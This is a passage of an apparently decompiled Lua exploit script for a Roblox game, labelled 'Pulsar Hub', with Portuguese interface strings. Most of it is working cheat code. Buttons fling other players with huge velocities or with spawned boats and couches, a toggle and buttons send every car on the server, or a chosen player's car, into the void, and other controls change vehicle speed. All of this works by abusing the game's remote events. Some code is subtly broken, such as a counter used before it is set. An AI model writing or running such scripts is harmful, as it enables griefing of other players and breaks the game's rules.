            local t37 = { v566 }
            while true do
                local _flingActive = flingActive

                if _flingActive then
                    _flingActive = t1value50 and (t1value50.Character and t1value50.Character:FindFirstChildOfClass("Humanoid"))
                end

                if not _flingActive or t1value50.Character:FindFirstChildOfClass("Humanoid").Sit then
                    break
                end

                v1196 = v1196 + 50

                for _, _ in ipairs(t37) do
                    local PositionX = t1value50.Character.HumanoidRootPart.Position.X
                    local PositionY = t1value50.Character.HumanoidRootPart.Position.Y
                    local PositionZ = t1value50.Character.HumanoidRootPart.Position.Z
                    local v1204 = PositionX + t1value50.Character.HumanoidRootPart.Velocity.X / 1.5
                    local v1205 = PositionY + t1value50.Character.HumanoidRootPart.Velocity.Y / 1.5
                    local v1206 = PositionZ + t1value50.Character.HumanoidRootPart.Velocity.Z / 1.5

                    v566.CFrame = CFrame.new(v1204, v1205, v1206) * CFrame.Angles(math.rad(v1196), 0, 0)
                end

                v566.Velocity = Vector3.new(900000000, 900000000, 900000000)
                v566.RotVelocity = Vector3.new(900000000, 900000000, 900000000)
                task.wait()
            end
            flingActive = false
            BodyVelocity:Destroy()
            Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
            Humanoid.PlatformStand = false
            v566.CFrame = CFrame4
            t1.value37.CameraSubject = Humanoid
            for _, descendant in pairs(Character:GetDescendants()) do
                if descendant:IsA("BasePart") then
                    descendant.Velocity = Vector3.zero
                    descendant.RotVelocity = Vector3.zero
                end
            end
            Humanoid:UnequipTools()
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(t36))
        end)
    end
end
})
v29:AddSection({
    Name = "Boat Method"
})
v29:AddButton({
    Name = "Fling Boat All",
    Callback = function()
    local LocalPlayer7 = game.Players.LocalPlayer
    local Character = LocalPlayer7.Character
    local Humanoid = Character:FindFirstChildOfClass("Humanoid")
    local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
    local Vehicles = game.Workspace:FindFirstChild("Vehicles")
    local HumanoidRootPartCFrame = HumanoidRootPart.CFrame
    local n9 = 0

    if not Vehicles:FindFirstChild(LocalPlayer7.Name .. "Car") and HumanoidRootPart then
        HumanoidRootPart.CFrame = CFrame.new(1754, -2, 58)
        task.wait(0.5)
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingBoat", "MilitaryBoatFree")
        task.wait(0.5)

        local v583 = Vehicles:FindFirstChild(LocalPlayer7.Name .. "Car")

        task.wait(0.5)

        local v584 = v583:FindFirstChild("Body") and v583.Body:FindFirstChild("VehicleSeat")

        if v584 then
            local _ = Humanoid.Sit

            repeat
                task.wait()
                HumanoidRootPart.CFrame = v584.CFrame * CFrame.new(0, math.random(-1, 1), 0)
            until Humanoid.Sit
        end
    end

    task.wait(0.5)

    local u586 = Vehicles:FindFirstChild(LocalPlayer7.Name .. "Car")

    if u586 and not Humanoid.Sit then
        local v587 = u586:FindFirstChild("Body") and u586.Body:FindFirstChild("VehicleSeat")

        if v587 then
            local _ = Humanoid.Sit

            repeat
                task.wait()
                HumanoidRootPart.CFrame = v587.CFrame * CFrame.new(0, math.random(-1, 1), 0)
            until Humanoid.Sit
        end
    end

    local BodyGyro = Instance.new("BodyGyro")

    BodyGyro.Parent = u586.PrimaryPart
    BodyGyro.MaxTorque = Vector3.new(10000000, 10000000, 10000000)
    BodyGyro.P = 10000000
    BodyGyro.CFrame = u586.PrimaryPart.CFrame * CFrame.Angles(0, 1.5707963267948966, 0)

    for _, player in pairs(game.Players:GetPlayers()) do
        if player ~= LocalPlayer7 then
            local Character2 = player.Character
            local v593 = Character2 and Character2:FindFirstChildOfClass("Humanoid")
            local v594 = Character2 and Character2:FindFirstChild("HumanoidRootPart")

            if Character2 and (v593 and v594) then
                (function(_, p33, _)
                    n9 = 0

                    local v1212 = tick() + 1

                    while v1212 > tick() do
                        n9 = n9 + 100
                        task.wait()

                        local function v1213(p35, p36, p37)
                            u586:SetPrimaryPartCFrame(CFrame.new(p35.Position) * p36 * p37)
                        end

                        v1213(p33, CFrame.new(0, 3, 0), CFrame.Angles(math.rad(n9), 0, 0))
                        v1213(p33, CFrame.new(0, -1.5, 2), CFrame.Angles(math.rad(n9), 0, 0))
                        v1213(p33, CFrame.new(2, 1.5, 2.25), CFrame.Angles(0.8726646259971648, 0, 0))
                        v1213(p33, CFrame.new(-2.25, -1.5, 2.25), CFrame.Angles(0.5235987755982988, 0, 0))
                        v1213(p33, CFrame.new(0, 1.5, 0), CFrame.Angles(math.rad(n9), 0, 0))
                        v1213(p33, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(n9), 0, 0))
                    end
                end)(Character2, v594, v593)
            end
        end
    end

    task.wait(0.5)
    u586:SetPrimaryPartCFrame(CFrame.new(0, 0, 0))
    task.wait(0.5)
    Humanoid.Sit = false
    task.wait(0.5)
    HumanoidRootPart.CFrame = HumanoidRootPartCFrame
    BodyGyro:Destroy()
end
})
v29:AddButton({
    Name = "Fling Boat",
    Callback = function()
    local v595 = not t1.value50

    if not v595 then
        v595 = not game.Players:FindFirstChild(t1.value50)
    end

    if v595 then
        return
    end

    local LocalPlayer8 = game.Players.LocalPlayer
    local Character = LocalPlayer8.Character
    local v598 = Character and Character:FindFirstChildOfClass("Humanoid")
    local v599 = Character and Character:FindFirstChild("HumanoidRootPart")
    local Vehicles = game.Workspace:FindFirstChild("Vehicles")

    if not v598 or not v599 then
        return
    end

    local v601 = Vehicles:FindFirstChild(LocalPlayer8.Name .. "Car") or (function()
        v599.CFrame = CFrame.new(1754, -2, 58)
        task.wait(0.5)
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingBoat", "MilitaryBoatFree")
        task.wait(1)

        return Vehicles:FindFirstChild(LocalPlayer8.Name .. "Car")
    end)()

    if not v601 then
        return
    end

    local v602 = v601:FindFirstChild("Body") and v601.Body:FindFirstChild("VehicleSeat")

    if not v602 then
        return
    end

    if v602 ~= v598.SeatPart then
    end

    repeat
        task.wait(0.1)
        v599.CFrame = v602.CFrame * CFrame.new(0, 1, 0)
    until v602 == v598.SeatPart

    local t1value50 = game.Players:FindFirstChild(t1.value50)

    if not t1value50 or not t1value50.Character then
        return
    end

    local Character3 = t1value50.Character
    local Humanoid = Character3:FindFirstChildOfClass("Humanoid")
    local HumanoidRootPart = Character3:FindFirstChild("HumanoidRootPart")

    if not HumanoidRootPart or not Humanoid then
        return
    end

    local BodyAngularVelocity = Instance.new("BodyAngularVelocity")

    BodyAngularVelocity.Name = "Spinning"
    BodyAngularVelocity.Parent = v601.PrimaryPart
    BodyAngularVelocity.MaxTorque = Vector3.new(0, 1e999, 0)
    BodyAngularVelocity.AngularVelocity = Vector3.new(0, 369, 0)

    local function v608(p38, p39)
        if v601 and v601.PrimaryPart then
            v601:SetPrimaryPartCFrame(CFrame.new(p38.Position + p39))
        end
    end

    task.spawn(function()
        while true do
            local v1216 = v601

            if v1216 then
                v1216 = v601.Parent and (HumanoidRootPart and HumanoidRootPart.Parent)
            end

            if not v1216 then
                break
            end

            task.wait(0.01)
            v608(HumanoidRootPart, Vector3.new(0, 1, 0))
            v608(HumanoidRootPart, Vector3.new(0, -2.25, 5))
            v608(HumanoidRootPart, Vector3.new(0, 2.25, 0.25))
            v608(HumanoidRootPart, Vector3.new(-2.25, -1.5, 2.25))
            v608(HumanoidRootPart, Vector3.new(0, 1.5, 0))
            v608(HumanoidRootPart, Vector3.new(0, -1.5, 0))

            if v601 and v601.PrimaryPart then
                local cFrame = CFrame.Angles(math.rad((math.random(-369, 369))), math.rad((math.random(-369, 369))), (math.rad((math.random(-369, 369)))))

                v601:SetPrimaryPartCFrame(CFrame.new(HumanoidRootPart.Position + Vector3.new(0, 1.5, 0)) * cFrame)
            end
        end

        if BodyAngularVelocity and BodyAngularVelocity.Parent then
            BodyAngularVelocity:Destroy()
        end
    end)
end
})
v29:AddButton({
    Name = "Cancel Fling Boat",
    Callback = function()
    local LocalPlayer9 = game.Players.LocalPlayer
    local Character = LocalPlayer9.Character
    local v611 = Character and Character:FindFirstChild("HumanoidRootPart")
    local v612 = Character and Character:FindFirstChildOfClass("Humanoid")
    local Vehicles = game.Workspace:FindFirstChild("Vehicles")

    if not v611 or not v612 then
        return
    end

    v612.PlatformStand = true

    for _, child in pairs(v611:GetChildren()) do
        if child:IsA("BodyAngularVelocity") or child:IsA("BodyVelocity") then
            child:Destroy()
        end
    end

    game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("DeleteAllVehicles")
    task.wait(0.5)

    if Vehicles then
        Vehicles = Vehicles:FindFirstChild(LocalPlayer9.Name .. "Car")
    end

    if Vehicles and Vehicles.PrimaryPart then
        for _, child in pairs(Vehicles.PrimaryPart:GetChildren()) do
            if child:IsA("BodyAngularVelocity") or child:IsA("BodyVelocity") then
                child:Destroy()
            end
        end
    end

    task.wait(1)

    local vector3 = Vector3.new(0, 1000, 0)
    local BodyPosition = Instance.new("BodyPosition", v611)

    BodyPosition.Position = vector3
    BodyPosition.MaxForce = Vector3.new(1e999, 1e999, 1e999)

    local BodyGyro = Instance.new("BodyGyro", v611)

    BodyGyro.CFrame = v611.CFrame
    BodyGyro.MaxTorque = Vector3.new(1e999, 1e999, 1e999)
    task.wait(3)
    BodyPosition:Destroy()
    BodyGyro:Destroy()
    v612.PlatformStand = false
end
})
v29:AddSection({
    Name = "Click Methods"
})
v29:AddButton({
    Name = "Click Fling Couch (Tool)",
    Callback = function()
    local Players5 = game:GetService("Players")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local UserInputService = game:GetService("UserInputService")
    local LocalPlayer10 = Players5.LocalPlayer
    local CurrentCamera = workspace.CurrentCamera
    local u626 = false
    local Backpack = LocalPlayer10:WaitForChild("Backpack")

    if not Backpack:FindFirstChild("Click Fling Couch") and (not LocalPlayer10.Character and LocalPlayer10.Character:FindFirstChild("Click Fling Couch")) then
        local Tool = Instance.new("Tool")

        Tool.Name = "Click Fling Couch"
        Tool.RequiresHandle = false
        Tool.CanBeDropped = false
        Tool.Equipped:Connect(function()
            u626 = true
        end)
        Tool.Unequipped:Connect(function()
            u626 = false
        end)
        Tool.Parent = Backpack
    end

    local function v629(p40)
        if not u626 then
            return
        end

        if not p40 or (not p40.Character or p40 == LocalPlayer10) then
            return
        end

        local u1219 = true
        local v1220 = LocalPlayer10.Character and LocalPlayer10.Character:FindFirstChild("HumanoidRootPart")
        local v1221 = p40.Character and p40.Character:FindFirstChild("HumanoidRootPart")

        if not v1220 or not v1221 then
            return
        end

        local Character = LocalPlayer10.Character
        local Humanoid = Character:FindFirstChildOfClass("Humanoid")
        local CFrame5 = v1220.CFrame

        ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")
        task.wait(0.2)
        ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
        task.wait(0.3)

        local Couch = LocalPlayer10.Backpack:FindFirstChild("Couch")

        if Couch then
            Couch.Parent = Character
        end

        task.wait(0.1)
        game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.F, false, game)
        task.wait(0.25)
        workspace.FallenPartsDestroyHeight = (0/0)

        local BodyVelocity = Instance.new("BodyVelocity")

        BodyVelocity.Name = "ForcaJogada"
        BodyVelocity.Velocity = Vector3.new(900000000, 900000000, 900000000)
        BodyVelocity.MaxForce = Vector3.new(1e999, 1e999, 1e999)
        BodyVelocity.Parent = v1220
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
        Humanoid.PlatformStand = false
        CurrentCamera.CameraSubject = p40.Character:FindFirstChild("Head") or (v1221 or Humanoid)
        task.spawn(function()
            local v1349
            local t38 = { v1220 }
            while true do
                local v1351 = u1219

                if v1351 then
                    v1351 = p40 and (p40.Character and p40.Character:FindFirstChildOfClass("Humanoid"))
                end

                if not v1351 or p40.Character:FindFirstChildOfClass("Humanoid").Sit then
                    break
                end

                v1349 = v1349 + 50

                for _, _ in ipairs(t38) do
                    local HumanoidRootPart = p40.Character.HumanoidRootPart
                    local v1355 = HumanoidRootPart.Position + HumanoidRootPart.Velocity / 1.5

                    v1220.CFrame = CFrame.new(v1355) * CFrame.Angles(math.rad(v1349), 0, 0)
                end

                v1220.Velocity = Vector3.new(900000000, 900000000, 900000000)
                v1220.RotVelocity = Vector3.new(900000000, 900000000, 900000000)
                task.wait()
            end
            u1219 = false
            BodyVelocity:Destroy()
            Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
            Humanoid.PlatformStand = false
            v1220.CFrame = CFrame5
            CurrentCamera.CameraSubject = Humanoid
            for _, descendant in pairs(Character:GetDescendants()) do
                if descendant:IsA("BasePart") then
                    descendant.Velocity = Vector3.zero
                    descendant.RotVelocity = Vector3.zero
                end
            end
            Humanoid:UnequipTools()
            ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
        end)

        while u1219 do
            task.wait()
        end
    end

    UserInputService.TouchTap:Connect(function(p41, p42)
        if not p42 then
            p42 = not u626
        end

        if p42 then
            return
        end

        local v1229 = p41[1]
        local v1230 = CurrentCamera:ScreenPointToRay(v1229.X, v1229.Y)
        local raycastResult = workspace:Raycast(v1230.Origin, v1230.Direction * 1000)

        if raycastResult and raycastResult.Instance then
            local player = Players5:GetPlayerFromCharacter(raycastResult.Instance:FindFirstAncestorOfClass("Model"))

            if player and player ~= LocalPlayer10 then
                v629(player)
                task.delay(2, function()
                end)
            end
        end
    end)
end
})
v29:AddButton({
    Name = "Click Kill Couch (Tool)",
    Callback = function()
    local Players6 = game:GetService("Players")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local RunService = game:GetService("RunService")
    local Workspace = game:GetService("Workspace")
    local UserInputService = game:GetService("UserInputService")
    local LocalPlayer11 = Players6.LocalPlayer
    local CurrentCamera = Workspace.CurrentCamera
    local s4 = "Click Kill Couch"
    local u638 = false
    local u639
    local u640
    local u641
    local Backpack = LocalPlayer11:WaitForChild("Backpack")
    if not Backpack:FindFirstChild(s4) then
        local Tool = Instance.new("Tool")

        Tool.Name = s4
        Tool.RequiresHandle = false
        Tool.CanBeDropped = false
        Tool.Equipped:Connect(function()
            u638 = true
        end)
        Tool.Unequipped:Connect(function()
            u638 = false
            u639 = nil
            limparSofa()
        end)
        Tool.Parent = Backpack
    end
    function limparSofa()
        if u640 then
            u640:Destroy()
            u640 = nil
        end

        if getgenv().AntiSit then
            getgenv().AntiSit:Set(false)
        end

        local v1233 = LocalPlayer11.Character and LocalPlayer11.Character:FindFirstChildOfClass("Humanoid")

        if v1233 then
            v1233:SetStateEnabled(Enum.HumanoidStateType.Physics, true)
            v1233:ChangeState(Enum.HumanoidStateType.GettingUp)
        end

        if u641 and nil then
            (nil).CFrame = u641
            u641 = nil
        end
    end
    function pegarSofa()
        local Character = LocalPlayer11.Character

        if not Character then
            return
        end

        local Backpack2 = LocalPlayer11.Backpack

        if not Backpack2:FindFirstChild("Couch") and not Character:FindFirstChild("Couch") then
            local v1236 = ReplicatedStorage.RE["1Too1l"]
            local t39 = { unpack({
                    "PickingTools",
                    "Couch"
                }) }

            v1236:InvokeServer(v2(t39))
            task.wait(0.1)
        end

        local v1238 = Backpack2:FindFirstChild("Couch") or Character:FindFirstChild("Couch")

        if v1238 then
            v1238.Parent = Character
        end
    end
    function posAleatoriaAbaixo(p43)
        local HumanoidRootPart = p43:FindFirstChild("HumanoidRootPart")

        if not HumanoidRootPart then
            return Vector3.new()
        end

        local vector3 = Vector3.new(math.random(-2, 2), -5.1, math.random(-2, 2))

        return HumanoidRootPart.Position + vector3
    end
    function tpAbaixo(p44)
        if not p44 or (not p44.Character or not p44.Character:FindFirstChild("HumanoidRootPart")) then
            return
        end

        local Character = LocalPlayer11.Character
        local v1244 = Character and Character:FindFirstChild("HumanoidRootPart")
        local v1245 = Character and Character:FindFirstChildOfClass("Humanoid")

        if not v1244 or not v1245 then
            return
        end

        v1245:SetStateEnabled(Enum.HumanoidStateType.Physics, false)

        if not u640 then
            u640 = Instance.new("Part")
            u640.Size = Vector3.new(10, 1, 10)
            u640.Anchored = true
            u640.CanCollide = true
            u640.Transparency = 0.5
            u640.Parent = Workspace
        end

        local v1246 = posAleatoriaAbaixo(p44.Character)

        u640.Position = v1246
        v1244.CFrame = CFrame.new(v1246)
        v1245:SetStateEnabled(Enum.HumanoidStateType.Physics, true)
    end
    function arremessarComSofa(p45)
        if not p45 then
            return
        end

        u639 = p45.Name

        local Character = LocalPlayer11.Character

        if not Character then
            return
        end

        u641 = Character:FindFirstChild("HumanoidRootPart") and Character.HumanoidRootPart.CFrame
        Character:FindFirstChild("HumanoidRootPart")
        pegarSofa()
        RunService.Heartbeat:Connect(function()
            local v1358 = Players6:FindFirstChild(u639)

            if not v1358 or (not v1358.Character or not v1358.Character:FindFirstChild("Humanoid")) then
                limparSofa()

                return
            end

            if getgenv().AntiSit then
                getgenv().AntiSit:Set(true)
            end

            tpAbaixo(v1358)
        end)
        task.spawn(function()
            local v1359 = Players6:FindFirstChild(u639)

            repeat
                if not (v1359 and (v1359.Character and v1359.Character:FindFirstChild("Humanoid"))) then
                    return
                end

                task.wait(0.05)
            until v1359.Character.Humanoid.SeatPart

            local cFrame = CFrame.new(265.46, -450.83, -59.93)

            v1359.Character.HumanoidRootPart.CFrame = cFrame
            LocalPlayer11.Character.HumanoidRootPart.CFrame = cFrame
            task.wait(0.4)
            limparSofa()
            task.wait(0.2)

            if u641 then
                LocalPlayer11.Character.HumanoidRootPart.CFrame = u641

                return
            end
        end)
    end
    UserInputService.TouchTap:Connect(function(p46, p47)
        if not u638 or p47 then
            return
        end

        local v1251 = p46[1]
        local v1252 = CurrentCamera:ScreenPointToRay(v1251.X, v1251.Y)
        local raycastResult = Workspace:Raycast(v1252.Origin, v1252.Direction * 1000)

        if raycastResult and raycastResult.Instance then
            local Model = raycastResult.Instance:FindFirstAncestorOfClass("Model")
            local player = Players6:GetPlayerFromCharacter(Model)

            if player and player ~= LocalPlayer11 then
                arremessarComSofa(player)
            end
        end
    end)
end
})
local v34 = t1.value19:MakeTab({
    "Vehicles",
    "car"
})
v34:AddSection({ "Speed Functions" })
t1.value65 = 200
t1.value66 = 11.3
function t1.value67()
    local t40 = {}

    if workspace:FindFirstChild("Vehicles") then
        for _, child in pairs(workspace.Vehicles:GetChildren()) do
            if child:FindFirstChild("Seats") and child.Seats:FindFirstChild("VehicleSeat") then
                table.insert(t40, child)
            end
        end
    end

    return t40
end
local function v35(p48, p49)
    local v649 = t1.value67()
    local n10 = 0

    for _, v in pairs(v649) do
        local VehicleSeat = v.Seats.VehicleSeat
        local p48_2 = VehicleSeat:FindFirstChild(p48)

        if p48_2 and p48_2.Value ~= nil then
            p48_2.Value = p49
            n10 = n10 + 1
        else
            pcall(function()
                VehicleSeat[p48] = p49
                n10 = n10 + 1
            end)
        end
    end

    newNotify("Pulsar Hub", "Pulsar Hub " .. n10 .. " cars modified")
end
v34:AddTextBox({
    Title = "Car Speed",
    Placeholder = "Example: 300",
    Callback = function(p50)
    local num = tonumber(p50)

    if num then
        t1.value65 = num
        newNotify("Pulsar Hub", "Speed set to: " .. num)

        return
    end

    newNotify("Pulsar Hub", "Invalid number")
end
})
v34:AddTextBox({
    Title = "Turbo Power",
    Placeholder = "Example: 15",
    Callback = function(p51)
    local num = tonumber(p51)

    if num then
        t1.value66 = num
        newNotify("Pulsar Hub", "Turbo set to: " .. num)

        return
    end

    newNotify("Pulsar Hub", "Invalid number")
end
})
v34:AddButton({
    Title = "Apply Speed (by: BRUTON)",
    Callback = function()
    v35("MaxSpeed", t1.value65)
end
})
v34:AddButton({
    Title = "Apply Turbo (by: BRUTON)",
    Callback = function()
    v35("Turbo", t1.value66)
end
})
v34:AddSection({ "all car functions" })

local Players7 = game:GetService("Players")

t1.value68 = game:GetService("Workspace")

local LocalPlayer12 = Players7.LocalPlayer
local CurrentCamera = t1.value68.CurrentCamera
t1.value69 = {}
t1.value69.Players = Players7
t1.value69.Workspace = t1.value68
t1.value69.LocalPlayer = LocalPlayer12
t1.value69.Camera = CurrentCamera
function t1.value69.MostrarNotificacao(_, p53)
    local u661 = p53
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Aviso",
            Text = u661,
            Duration = 5
        })
    end)
end
function t1.value69.ToggleFallDamage(p54, p55)
    if not p54.LocalPlayer.Character or not p54.LocalPlayer.Character:FindFirstChild("Humanoid") then
        return false
    end

    local Humanoid = p54.LocalPlayer.Character.Humanoid

    if p55 then
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp, true)
        Humanoid.PlatformStand = false

        return true
    end

    Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
    Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, true)

    return false
end
function t1.value69.TeleportToSeat(p56, p57, _)
    if not p56.LocalPlayer.Character or not p56.LocalPlayer.Character:FindFirstChild("Humanoid") then
        p56:MostrarNotificacao("Personagem não encontrado!")

        return false
    end

    local Humanoid = p56.LocalPlayer.Character.Humanoid
    local HumanoidRootPart = p56.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")

    if not HumanoidRootPart then
        p56:MostrarNotificacao("Parte raiz do personagem não encontrada!")

        return false
    end

    Humanoid.Sit = false
    task.wait(0.1)
    HumanoidRootPart.CFrame = p57.CFrame + Vector3.new(0, 5, 0)
    task.wait(0.1)
    p57:Sit(Humanoid)
    task.wait(0.5)

    return p57 == Humanoid.SeatPart
end
function t1.value69.TeleportToVoid(p59, p60)
    if not p60 then
        p59:MostrarNotificacao("Veículo inválido!")

        return
    end

    if not p60.PrimaryPart then
        local v672 = p60:FindFirstChild("Body", true) or p60:FindFirstChild("Chassis", true)

        if not (v672 and v672:IsA("BasePart")) then
            p59:MostrarNotificacao("Parte principal do veículo não encontrada!")

            return
        end

        p60.PrimaryPart = v672
    end

    local vector3 = Vector3.new(0, -1000, 0)

    p60:SetPrimaryPartCFrame(CFrame.new(vector3))
    task.wait(0.5)
end
function t1.value69.TeleportToPlayer(p61, p62, p63)
    if not p62 then
        p61:MostrarNotificacao("Veículo inválido!")

        return
    end

    if not p62.PrimaryPart then
        local v677 = p62:FindFirstChild("Body", true) or p62:FindFirstChild("Chassis", true)

        if not (v677 and v677:IsA("BasePart")) then
            p61:MostrarNotificacao("Parte principal do veículo não encontrada!")

            return
        end

        p62.PrimaryPart = v677
    end

    local v678 = p63 + Vector3.new(5, 0, 5)
    local t41 = { CFrame.new(v678) }

    p62:SetPrimaryPartCFrame(v2(t41))
    task.wait(0.5)
end
function t1.value69.ExitCarAndReturn(p64, p65)
    if not p64.LocalPlayer.Character or not p64.LocalPlayer.Character:FindFirstChild("Humanoid") then
        return
    end

    local Humanoid = p64.LocalPlayer.Character.Humanoid

    if Humanoid.SeatPart then
        Humanoid.Sit = false
    end

    task.wait(0.1)

    if p65 then
        local Character = p64.LocalPlayer.Character
        local t42 = { CFrame.new(p65) }

        Character:PivotTo(v2(t42))
    end
end
function t1.value69.AtualizarListaCarros(p66)
    local Vehicles = p66.Workspace:FindFirstChild("Vehicles")
    local t43 = {}

    if Vehicles then
        local GetChildren = Vehicles.GetChildren

        for _, v in ipairs(GetChildren(Vehicles)) do
            if v.Name:match("Car$") then
                table.insert(t43, v.Name)
            end
        end
    end

    return t43
end
v34:AddToggle({
    Name = "Matar todos os carros do server",
    Description = "Teleporta os carros para o void",
    Default = false,
    Callback = function(p67)
    local HumanoidRootPartPosition
    if p67 then
        if not (self.LocalPlayer.Character and self.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")) then
            t1.value69:MostrarNotificacao("Personagem não encontrado!")

            return
        end

        HumanoidRootPartPosition = self.LocalPlayer.Character.HumanoidRootPart.Position
        t1.value69:ToggleFallDamage(true)
        spawn(function()
            local Vehicles = t1.value69.Workspace:FindFirstChild("Vehicles")
            if not Vehicles then
                t1.value69:MostrarNotificacao("Pasta de veículos não encontrada!")

                return
            end
            local t44 = {}
            local GetChildren = Vehicles.GetChildren
            for v1261, v1262 in ipairs(GetChildren(Vehicles)) do

                if v1262.Name:match("Car$") then
                    table.insert(t44, v1262)
                end
            end
            for _, v in ipairs(t44) do
                if not p67 then
                    break
                end

                local VehicleSeat = v:FindFirstChildWhichIsA("VehicleSeat", true)

                if VehicleSeat and VehicleSeat.Occupant == nil and t1.value69:TeleportToSeat(VehicleSeat, v) then
                    t1.value69:TeleportToVoid(v)
                    t1.value69:ExitCarAndReturn(HumanoidRootPartPosition)
                    task.wait(1)
                end
            end
            if p67 then
                t1.value69:ToggleFallDamage(false)
            end
        end)
    else
        t1.value69:ToggleFallDamage(false)
    end
end
})
v34:AddSection({ "functions dos carro" })

local AddDropdown = v34.AddDropdown
local v40 = t1.value69:AtualizarListaCarros()
t1.value70 = AddDropdown(v34, {
    Name = "Selecionar Carro do Jogador",
    Description = "Selecione o carro de um jogador",
    Default = nil,
    Options = v40,
    Callback = function(p68)
    _G.SelectedVehicle = p68
end
})
v34:AddToggle({
    Name = "Ver Câmera do Carro Selecionado",
    Description = "Foca a câmera no carro selecionado",
    Default = false,
    Callback = function(p69)
    if p69 then
        if not _G.SelectedVehicle or _G.SelectedVehicle == "" then
            t1.value69:MostrarNotificacao("Nenhum carro selecionado!")

            return
        end

        local Vehicles = t1.value69.Workspace:FindFirstChild("Vehicles")

        if not Vehicles then
            t1.value69:MostrarNotificacao("Pasta de veículos não encontrada!")

            return
        end

        local _GSelectedVehicle = Vehicles:FindFirstChild(_G.SelectedVehicle)

        if not _GSelectedVehicle then
            t1.value69:MostrarNotificacao("Carro selecionado não encontrado!")

            return
        end

        local VehicleSeat = _GSelectedVehicle:FindFirstChildWhichIsA("VehicleSeat", true)

        if not VehicleSeat then
            t1.value69:MostrarNotificacao("Assento do carro não encontrado!")

            return
        end

        t1.value69.OriginalCameraSubject = t1.value69.Camera.CameraSubject
        t1.value69.OriginalCameraType = t1.value69.Camera.CameraType
        t1.value69.Camera.CameraSubject = VehicleSeat
        t1.value69.Camera.CameraType = Enum.CameraType.Follow
        t1.value69:MostrarNotificacao("Câmera ajustada para o carro " .. _G.SelectedVehicle .. "!")

        return
    end

    if t1.value69.OriginalCameraSubject then
        t1.value69.Camera.CameraSubject = t1.value69.OriginalCameraSubject
        t1.value69.Camera.CameraType = t1.value69.OriginalCameraType or Enum.CameraType.Custom
        t1.value69:MostrarNotificacao("Câmera restaurada ao normal!")
        t1.value69.OriginalCameraSubject = nil
        t1.value69.OriginalCameraType = nil
    end
end
})
t1.value69.Workspace:WaitForChild("Vehicles").ChildAdded:Connect(function()
    t1.value70:Set(t1.value69:AtualizarListaCarros())
end)
t1.value69.Workspace:WaitForChild("Vehicles").ChildRemoved:Connect(function()
    local value70 = t1.value70
    local t45 = { t1.value69:AtualizarListaCarros() }

    value70:Set(v2(t45))
end)
v34:AddSection({ "functions kill e trazer" })
v34:AddButton({
    Name = "Destruir Carro Selecionado",
    Description = "Teleporta o carro selecionado para o void",
    Callback = function()
    if not _G.SelectedVehicle or _G.SelectedVehicle == "" then
        t1.value69:MostrarNotificacao("Nenhum carro selecionado!")

        return
    end

    local Vehicles = t1.value69.Workspace:FindFirstChild("Vehicles")

    if not Vehicles then
        t1.value69:MostrarNotificacao("Pasta de veículos não encontrada!")

        return
    end

    local _GSelectedVehicle = Vehicles:FindFirstChild(_G.SelectedVehicle)

    if not _GSelectedVehicle then
        t1.value69:MostrarNotificacao("Carro selecionado não encontrado!")

        return
    end

    local VehicleSeat = _GSelectedVehicle:FindFirstChildWhichIsA("VehicleSeat", true)

    if not VehicleSeat then
        t1.value69:MostrarNotificacao("Assento do carro não encontrado!")

        return
    end

    if VehicleSeat.Occupant then
        t1.value69:MostrarNotificacao("O kill car não foi possível, há alguém sentado no assento do motorista!")

        return
    end

    if t1.value69.LocalPlayer.Character and t1.value69.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        local HumanoidRootPartPosition = t1.value69.LocalPlayer.Character.HumanoidRootPart.Position

        t1.value69:ToggleFallDamage(true)

        if t1.value69:TeleportToSeat(VehicleSeat, _GSelectedVehicle) then
            t1.value69:TeleportToVoid(_GSelectedVehicle)
            t1.value69:MostrarNotificacao("Carro " .. _G.SelectedVehicle .. " foi teleportado para o void!")
            t1.value69:ExitCarAndReturn(HumanoidRootPartPosition)
        else
            t1.value69:MostrarNotificacao("Falha ao sentar no carro!")
        end

        t1.value69:ToggleFallDamage(false)

        return
    end

    t1.value69:MostrarNotificacao("Personagem do jogador não encontrado!")
end
})
v34:AddButton({
    Name = "Trazer Carro Selecionado",
    Description = "Teleporta o carro selecionado para sua posição",
    Callback = function()
    if not _G.SelectedVehicle or _G.SelectedVehicle == "" then
        t1.value69:MostrarNotificacao("Nenhum carro selecionado!")

        return
    end

    local Vehicles = t1.value69.Workspace:FindFirstChild("Vehicles")

    if not Vehicles then
        t1.value69:MostrarNotificacao("Pasta de veículos não encontrada!")

        return
    end

    local _GSelectedVehicle = Vehicles:FindFirstChild(_G.SelectedVehicle)

    if not _GSelectedVehicle then
        t1.value69:MostrarNotificacao("Carro selecionado não encontrado!")

        return
    end

    local VehicleSeat = _GSelectedVehicle:FindFirstChildWhichIsA("VehicleSeat", true)

    if not VehicleSeat then
        t1.value69:MostrarNotificacao("Assento do carro não encontrado!")

        return
    end

    if VehicleSeat.Occupant then
        t1.value69:MostrarNotificacao("O teleporte do carro não foi possível, há alguém sentado no assento do motorista!")

        return
    end

